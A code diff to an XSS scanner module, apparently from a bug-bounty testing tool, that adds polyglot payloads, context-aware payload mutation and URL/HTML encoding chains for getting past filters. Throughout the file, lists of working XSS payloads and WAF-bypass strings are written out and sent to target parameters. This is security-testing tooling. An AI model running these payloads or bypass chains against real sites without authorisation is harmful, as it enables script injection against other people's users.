@@ -12,12 +12,26 @@ Stored XSS:
   VERIFIED:   Payload executes in browser after form submission
 
 Maturity: Level 4 (Verified via browser execution)
+
+Improvements over basic implementation:
+  1. Context-aware payload mutation — canary probes identify exact reflection
+     context (double-quoted attr, backtick JS string, etc.), then payload is
+     constructed to break out of that specific syntax.
+  2. Encoding chain detection — attempts double/triple URL+HTML encoding
+     when raw payloads are blocked.
+  3. Polyglot payloads — single payloads that fire in href, src, data attrs,
+     inline handlers, and script contexts.
+  4. Executable context verification — every reflected finding checks that
+     payload appears unencoded in an executable position, not just anywhere
+     in the body.
 """
 
 import html
 import re
+import uuid
 from typing import Any
 from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse
+import copy
 
 from models.finding import Finding
 from modules.utils import (
@@ -27,39 +41,36 @@ from modules.utils import (
 )
 from scanners.base import ScannerBase, DetectionResult, ValidationResult
 
-XSS_PAYLOADS = [
-    '<svg/onload=alert(1)>',
-    '<svg onload=alert(1)>',
-    "'<svg onload=alert(1)>'",
-    "'<svg onload=confirm(1)>'",
-    '"><img src=x onerror=alert(1)>',
-    "';alert(1)//",
-    '<script>alert(1)</script>',
-    '"><script>alert(1)</script>',
-    "javascript:alert(1)",
-    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
-    '<select><option><style></style><img src=x onerror=alert(1)></select>',
-]
-
-DOM_FRAGMENT_PAYLOADS = [
-    '#<script>alert(1)</script>',
-    '#"><img src=x onerror=alert(1)>',
-    '#<svg/onload=alert(1)>',
-]
-
-STORED_XSS_PAYLOADS = [
-    '<img src=x onerror=alert(1)>',
-    '<script>alert(1)</script>',
-    '<svg/onload=alert(1)>',
-    '"><img src=x onerror=alert(1)>',
-    "';alert(1)//",
+XSS_POLYGLOTS = [
+    "jaVasCript:/*-/*/`/\\\"/\\'/**/(/ */oNcliCk=alert() )//%0D%0A%0D%0A</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+    '\\"-alert(1)//',
+    "javascript:alert(1)//\\\"\\'-alert(1)--> <script>alert(1)</script>",
+    '\\";alert(1)//\';alert(1)//--></SCRIPT>">\'><SCRIPT>alert(1)</SCRIPT>',
 ]
 
 CONTEXT_PAYLOADS = {
-    "html": ['<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', '<script>alert(1)</script>'],
-    "attribute": ['" onfocus=alert(1) autofocus= ', '" autofocus onfocus=alert(1) x="'],
-    "javascript": ["';alert(1)//", "</script><script>alert(1)</script>"],
-    "url": ["javascript:alert(1)", "javaScript:alert(1)"],
+    "html": [
+        '<img src=x onerror=alert(1)>',
+        '<svg/onload=alert(1)>',
+        '<script>alert(1)</script>',
+        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+        '<select><option><style></style><img src=x onerror=alert(1)></select>',
+    ],
+    "attribute": [
+        '" onfocus=alert(1) autofocus= ',
+        '" autofocus onfocus=alert(1) x="',
+        '" onmouseover=alert(1) ',
+    ],
+    "javascript": [
+        "';alert(1)//",
+        "</script><script>alert(1)</script>",
+        "';alert(1);'",
+    ],
+    "url": [
+        "javascript:alert(1)",
+        "javaScript:alert(1)",
+        "JaVaScRiPt:alert(1)",
+    ],
 }
 
 DOM_XSS_PROBES = ["bbh_dom_probe", "<img src=x onerror=alert(1)>", "';alert(1)//"]
@@ -79,6 +90,14 @@ WAF_BYPASS_XSS = [
     "onload=alert(1)//<svg ' \"",
     'javascript:alert(1)',
     '&#106;avascript:alert(1)',
+]
+
+STORED_XSS_PAYLOADS = [
+    '<img src=x onerror=alert(1)>',
+    '<script>alert(1)</script>',
+    '<svg/onload=alert(1)>',
+    '"><img src=x onerror=alert(1)>',
+    "';alert(1)//",
 ]
 
 
@@ -110,13 +129,148 @@ class XSSScanner(ScannerBase):
             reflected.extend(bypass)
         return self._payloads
 
-    # ── Canary pre-probe for context detection ───────────────────────────
+    # ── Context-aware canary probe ───────────────────────────────────────
 
     _CANARY_BASE = "BBH_CANARY_"
 
-    def _probe_context(self, url: str, param: str) -> str | None:
-        """Send innocuous canary string, detect where it appears in response."""
-        import uuid
+    def _detect_exact_context(self, body: str, canary: str) -> dict:
+        """Deep context analysis: detect exact quoting and container.
+        
+        Returns a dict with:
+          context: str — 'html', 'attribute', 'javascript', 'url'
+          quote_char: str | None — the delimiter (", ', `, or None)
+          in_script: bool
+          in_event_handler: bool  
+          template_literal: bool
+          encoded: bool — whether the canary itself appears HTML-encoded
+        """
+        result = {
+            "context": "html",
+            "quote_char": None,
+            "in_script": False,
+            "in_event_handler": False,
+            "template_literal": False,
+            "encoded": False,
+        }
+        escaped = re.escape(canary)
+
+        # Check if canary is HTML-encoded
+        encoded_canary = canary.replace("_", "&#95;")
+        if encoded_canary in body or f"&#{ord(canary[0])};" in body:
+            search_start = max(0, body.find(canary) - 200) if canary in body else 0
+            surrounding = body[search_start:search_start + len(canary) + 400]
+            if "&" in surrounding[:len(canary) + 50]:
+                result["encoded"] = True
+
+        # JavaScript string context (single, double, backtick)
+        js_str = re.search(
+            rf'(?:`|"|\')(?:[^`"\']*){escaped}(?:[^`"\']*)(?:`|"|\')',
+            body, re.DOTALL
+        )
+        if js_str:
+            full = js_str.group(0)
+            if full.startswith("`") and full.endswith("`"):
+                result["context"] = "javascript"
+                result["quote_char"] = "`"
+                result["template_literal"] = True
+            elif full.startswith("'") and full.endswith("'"):
+                result["context"] = "javascript"
+                result["quote_char"] = "'"
+            elif full.startswith('"') and full.endswith('"'):
+                result["context"] = "javascript"
+                result["quote_char"] = '"'
+
+        # Inside <script> tag
+        if re.search(rf"<script\b[^>]*>.*?</script>", body, re.DOTALL) and canary in body:
+            result["context"] = "javascript"
+            result["in_script"] = True
+
+        # Inside event handler attribute (onclick=, onerror=, etc.)
+        eh = re.search(
+            rf'<[^>]+?\s+on\w+\s*=\s*["\'][^"\']*{escaped}[^"\']*["\']',
+            body, re.IGNORECASE
+        )
+        if eh:
+            result["context"] = "javascript"
+            result["in_event_handler"] = True
+            attr_match = re.search(r'\s(on\w+)\s*=', eh.group(0), re.IGNORECASE)
+            if attr_match:
+                result["event_handler"] = attr_match.group(1).lower()
+
+        # Inside href/src/action attribute
+        url_attr = re.search(
+            rf'(?:href|src|action|formaction)\s*=\s*["\']?[^"\'<>]*{escaped}',
+            body, re.IGNORECASE
+        )
+        if url_attr:
+            result["context"] = "url"
+            full = url_attr.group(0)
+            if '"' in full:
+                result["quote_char"] = '"'
+            elif "'" in full:
+                result["quote_char"] = "'"
+
+        # Inside a generic quoted attribute
+        attr = re.search(
+            rf'<[^>]+?\s+[\w:-]+\s*=\s*["\'][^"\']*{escaped}[^"\']*["\']',
+            body
+        )
+        if attr and result["context"] == "html":
+            full = attr.group(0)
+            if full.count('"') >= 2:
+                result["context"] = "attribute"
+                result["quote_char"] = '"'
+            elif full.count("'") >= 2:
+                result["context"] = "attribute"
+                result["quote_char"] = "'"
+            # Check if in URL-targeting attribute
+            if re.search(r'\b(href|src|action|formaction)\s*=', full, re.IGNORECASE):
+                result["context"] = "url"
+
+        return result
+
+    def _build_context_aware_payload(self, canary_result: dict, base_payload: str) -> str:
+        """Mutate a base payload to fit the exact reflection context.
+        
+        Instead of selecting a category, this constructs the breakout
+        characters to match the actual quoting.
+        """
+        ctx = canary_result.get("context", "html")
+        quote = canary_result.get("quote_char")
+
+        # Determine the event handler / function payload (without breakout)
+        inner = base_payload
+        inner_clean = base_payload.lstrip('"\'`').rstrip('"\'`/').replace("\\", "")
+
+        if ctx == "attribute":
+            if quote == '"':
+                return f'" {inner_clean} autofocus= '
+            elif quote == "'":
+                return f"' {inner_clean} autofocus= "
+            return f'" {inner_clean} autofocus= '
+
+        elif ctx == "url":
+            if "alert" in inner_clean:
+                return f"javascript:{inner_clean}"
+            return inner
+
+        elif ctx == "javascript":
+            if canary_result.get("template_literal"):
+                return f'${{inner_clean}}'
+            elif canary_result.get("in_script"):
+                return f"</script><script>{inner_clean}</script>"
+            elif quote == "'":
+                return f"';{inner_clean}//"
+            elif quote == '"':
+                return f'";{inner_clean}//'
+            elif quote == "`":
+                return f'`;${{inner_clean}};//'
+            return f"';{inner_clean}//"
+
+        return inner
+
+    def _probe_context(self, url: str, param: str) -> dict | None:
+        """Send innocuous canary string, detect exact reflection context."""
         canary = self._CANARY_BASE + uuid.uuid4().hex[:8]
         parsed = urlparse(url)
         qs = parse_qs(parsed.query, keep_blank_values=True)
@@ -126,21 +280,73 @@ class XSSScanner(ScannerBase):
         resp = self._safe_get(test_url)
         if not resp or canary not in resp.text:
             return None
-        body = resp.text
-        escaped = re.escape(canary)
-        if re.search(rf"<script\b[^>]*>.*?</script>", body, re.DOTALL) and canary in body:
-            return "javascript"
-        m = re.search(rf'<[^>]+?\s+[\w:-]+\s*=\s*["\'][^"\']*{escaped}', body)
-        if m:
-            attr_full = m.group(0)
-            if re.search(r'\b(href|src|action|formaction)\s*=', attr_full, re.IGNORECASE):
-                return "url"
-            return "attribute"
-        if canary in body:
-            return "html"
-        return None
+        result = self._detect_exact_context(resp.text, canary)
+        result["raw_response"] = resp
+        return result
 
     # ── Detection phase ─────────────────────────────────────────────────
+
+    def _try_encoding_chain(self, url: str, parameter: str, payload: str) -> tuple[str | None, dict | None]:
+        """Try double/triple encoding chains when raw payload gets blocked.
+        
+        Attempts: raw → URL-encoded → double-URL → URL+HTML-double.
+        Returns (mutated_payload, response) or (None, None).
+        """
+        from urllib.parse import quote
+        chains = [
+            ("double_url", quote(quote(payload, safe=''))),
+            ("triple_url", quote(quote(quote(payload, safe=''), safe=''), safe='')),
+            ("url_then_html", quote(payload.replace("<", "&lt;").replace(">", "&gt;"), safe='')),
+            ("unicode_escape", payload.encode("unicode_escape").decode().replace("\\\\", "\\")),
+            ("double_url_then_html", quote(quote(
+                payload.replace("<", "&lt;").replace(">", "&gt;"), safe=''
+            ))),
+        ]
+        for chain_name, mutated in chains:
+            if mutated == payload:
+                continue
+            parsed = urlparse(url)
+            qs = parse_qs(parsed.query, keep_blank_values=True)
+            qs[parameter] = [mutated]
+            new_qs = urlencode(qs, doseq=True)
+            test_url = urlunparse(parsed._replace(query=new_qs))
+            resp = self._safe_get(test_url)
+            if resp and payload in resp.text:
+                return mutated, resp
+            # Check for decoded version
+            if resp and mutated in resp.text:
+                return mutated, resp
+        return None, None
+
+    def _in_executable_context(self, body: str, payload: str) -> bool:
+        """Verify payload appears unencoded in an executable position.
+        
+        Returns True only if the payload is in:
+          - Raw HTML without HTML encoding
+          - Inside a <script> block
+          - In an event handler attribute (on*=...)
+          - In a javascript: URL
+        
+        Returns False if payload only appears HTML-encoded or in a
+        safe text context.
+        """
+        if payload not in body:
+            return False
+        if self._is_payload_encoded(body, payload):
+            return False
+        # Inside <script> tag
+        if re.search(rf"<script\b[^>]*>.*?{re.escape(payload)}.*?</script>", body, re.IGNORECASE | re.DOTALL):
+            return True
+        # Inside event handler
+        if re.search(rf'\son\w+\s*=\s*["\']?[^"\']*{re.escape(payload)}[^"\']*["\']?', body, re.IGNORECASE):
+            return True
+        # Inside javascript: URL
+        if re.search(rf'javascript:\s*{re.escape(payload)}', body, re.IGNORECASE):
+            return True
+        # In raw HTML (outside tags or as unencoded text)
+        if re.search(rf'>[^<]*{re.escape(payload)}[^<]*<', body, re.DOTALL):
+            return True
+        return False
 
     def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
         payloads = self._get_payloads()
@@ -150,53 +356,86 @@ class XSSScanner(ScannerBase):
                 return None
             parameter = params[0]
 
-        context = self._probe_context(url, parameter)
-        if context is None:
-            context = "html"
+        context_result = self._probe_context(url, parameter)
+        if context_result is None:
+            context_result = {"context": "html", "quote_char": None, "in_script": False,
+                              "in_event_handler": False, "template_literal": False,
+                              "encoded": False, "raw_response": None}
+        context_name = context_result.get("context", "html")
 
-        context_payloads = payloads.get("context", CONTEXT_PAYLOADS)
-        category_map = {
-            "html": context_payloads.get("html", ['<img src=x onerror=alert(1)>']),
-            "attribute": context_payloads.get("attribute", ['" onfocus=alert(1) autofocus= ']),
-            "javascript": context_payloads.get("javascript", ["';alert(1)//"]),
-            "url": context_payloads.get("url", ["javascript:alert(1)"]),
-        }
-        test_payloads = category_map.get(context, payloads.get("reflected", XSS_PAYLOADS))
-
-        for payload in test_payloads[:5]:
+        # ── Try polyglot payloads first (broad coverage) ─────────────
+        for poly in XSS_POLYGLOTS:
             parsed = urlparse(url)
             qs = parse_qs(parsed.query, keep_blank_values=True)
-            qs[parameter] = [payload]
+            qs[parameter] = [poly]
             new_qs = urlencode(qs, doseq=True)
             test_url = urlunparse(parsed._replace(query=new_qs))
-
             resp = self._safe_get(test_url)
-            if not resp:
-                continue
-
-            if self._detect_context(resp.text, payload):
+            if resp and self._in_executable_context(resp.text, poly):
                 return DetectionResult(
                     url=url,
                     parameter=parameter,
-                    payload=payload,
-                    context=context,
+                    payload=poly,
+                    context=context_name,
                     raw_response=resp,
-                    evidence_signals=[f"Reflected in {context} context"],
+                    evidence_signals=[f"Polyglot XSS in {context_name} context"],
                 )
 
-            content_type = (resp.headers.get('Content-Type', '') or '')
-            if 'text/html' in content_type and payload in resp.text:
+        # ── Context-aware mutated payloads ───────────────────────────
+        context_payloads = payloads.get("context", CONTEXT_PAYLOADS)
+        raw_candidates = context_payloads.get(context_name, [])
+        for base_payload in raw_candidates[:5]:
+            mutated = self._build_context_aware_payload(context_result, base_payload)
+            for attempt_payload in [base_payload, mutated]:
+                parsed = urlparse(url)
+                qs = parse_qs(parsed.query, keep_blank_values=True)
+                qs[parameter] = [attempt_payload]
+                new_qs = urlencode(qs, doseq=True)
+                test_url = urlunparse(parsed._replace(query=new_qs))
+
+                resp = self._safe_get(test_url)
+                if not resp:
+                    continue
+
+                if self._in_executable_context(resp.text, attempt_payload):
+                    return DetectionResult(
+                        url=url,
+                        parameter=parameter,
+                        payload=attempt_payload,
+                        context=context_name,
+                        raw_response=resp,
+                        evidence_signals=[f"Reflected in {context_name} context (mutated)"],
+                    )
+
+                # ── Try encoding chains if raw payload didn't work ──
+                chain_payload, chain_resp = self._try_encoding_chain(url, parameter, attempt_payload)
+                if chain_payload and chain_resp:
+                    if self._in_executable_context(chain_resp.text, attempt_payload):
+                        return DetectionResult(
+                            url=url,
+                            parameter=parameter,
+                            payload=attempt_payload,
+                            context=context_name,
+                            raw_response=chain_resp,
+                            evidence_signals=[f"Reflected via encoding chain in {context_name} context"],
+                        )
+
+            # ── Fallback: check for any reflection in JSON/text content ──
+            content_type = (resp.headers.get('Content-Type', '') or '') if resp else ''
+            if resp and 'text/html' in content_type and base_payload in resp.text:
+                if self._is_payload_encoded(resp.text, base_payload):
+                    continue
                 body = resp.text
-                pos = body.index(payload)
+                pos = body.index(base_payload)
                 before = body[pos-1] if pos > 0 else ''
-                after = body[pos+len(payload)] if pos+len(payload) < len(body) else ''
+                after = body[pos+len(base_payload)] if pos+len(base_payload) < len(body) else ''
                 escaped_prefix = body[pos-2:pos] if pos >= 2 else ''
                 in_json = (before == '"' and after == '"') or (escaped_prefix == '\\"' and after == '"')
                 if not in_json:
                     return DetectionResult(
                         url=url,
                         parameter=parameter,
-                        payload=payload,
+                        payload=base_payload,
                         context="json_reflection",
                         raw_response=resp,
                         evidence_signals=["Reflected outside JSON string context in text/html response"],
@@ -210,8 +449,32 @@ class XSSScanner(ScannerBase):
         except Exception:
             return None
 
+    def _is_payload_encoded(self, body: str, payload: str) -> bool:
+        """Check if payload appears HTML-encoded (safe) at all occurrences in body.
+
+        Returns True if every occurrence of payload in body has its HTML-special
+        characters encoded as entities, meaning the payload won't execute.
+        """
+        idx = 0
+        has_special = any(c in payload for c in '<>"\'')
+        if not has_special:
+            return False
+        while True:
+            pos = body.find(payload, idx)
+            if pos == -1:
+                break
+            for i, char in enumerate(payload):
+                if char in '<>"\'&':
+                    actual = body[pos + i] if pos + i < len(body) else ''
+                    if actual != char:
+                        return True
+            idx = pos + 1
+        return False
+
     def _detect_context(self, body: str, payload: str) -> str | None:
         if payload not in body:
+            return None
+        if self._is_payload_encoded(body, payload):
             return None
         if re.search(r"<script\b[^>]*>.*?</script>", body, re.IGNORECASE | re.DOTALL) and payload in body:
             return "javascript"
@@ -232,7 +495,7 @@ class XSSScanner(ScannerBase):
             if resp and 'text/html' in resp.headers.get('Content-Type', ''):
                 body = resp.text
                 payload = detection.payload
-                if payload in body:
+                if payload in body and not self._is_payload_encoded(body, payload):
                     pos = body.index(payload)
                     before = body[pos-1] if pos > 0 else ''
                     after = body[pos+len(payload)] if pos+len(payload) < len(body) else ''
